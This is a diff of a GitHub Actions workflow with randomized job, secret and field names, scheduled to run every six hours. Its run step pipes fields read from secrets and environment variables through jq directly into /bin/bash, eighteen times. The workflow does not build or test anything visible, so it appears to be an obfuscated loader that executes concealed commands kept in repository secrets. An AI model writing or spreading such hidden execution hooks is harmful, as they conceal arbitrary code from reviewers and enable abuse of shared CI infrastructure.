@@ -1,22 +1,35 @@
 name: yuchangkan3910
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 5/6 * * *'
+    - cron: '24 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yuchangkan3910
         env:
-          ucp80715: ${{ secrets.ucp80715 }}
+          jrzzz22866: ${{ secrets.jrzzz22866 }}
         run: |
-          echo $ucp80715 | jq -r .yno555 | /bin/bash
-          echo $vwfh82058 | jq -r .x7 | /bin/bash
-          echo $u20 | jq -r .ib90 | /bin/bash
-          echo $x6 | jq -r .drh32158 | /bin/bash
-          echo $pnz92916 | jq -r .bxhr3 | /bin/bash
+          echo $jrzzz22866 | jq -r .l91 | /bin/bash
+          echo $lazb6 | jq -r .npfa14966 | /bin/bash
+          echo $v73 | jq -r .gnfa55 | /bin/bash
+          echo $ktbph1351 | jq -r .lq9 | /bin/bash
+          echo $pyfx7830 | jq -r .bt9527 | /bin/bash
+          echo $r04 | jq -r .rsn146 | /bin/bash
+          echo $tgxi70453 | jq -r .uc13034 | /bin/bash
+          echo $klrtw7 | jq -r .j554 | /bin/bash
+          echo $cq244 | jq -r .amhl011 | /bin/bash
+          echo $nfu0 | jq -r .vvrtx689 | /bin/bash
+          echo $arrl9664 | jq -r .yclxk9295 | /bin/bash
+          echo $perr4089 | jq -r .qc40116 | /bin/bash
+          echo $uo42 | jq -r .e4 | /bin/bash
+          echo $ya783 | jq -r .c4 | /bin/bash
+          echo $hk580 | jq -r .fb8 | /bin/bash
+          echo $j930 | jq -r .zyv05 | /bin/bash
+          echo $sr0430 | jq -r .z54 | /bin/bash
+          echo $ljonp49013 | jq -r .gfoc64 | /bin/bash
 
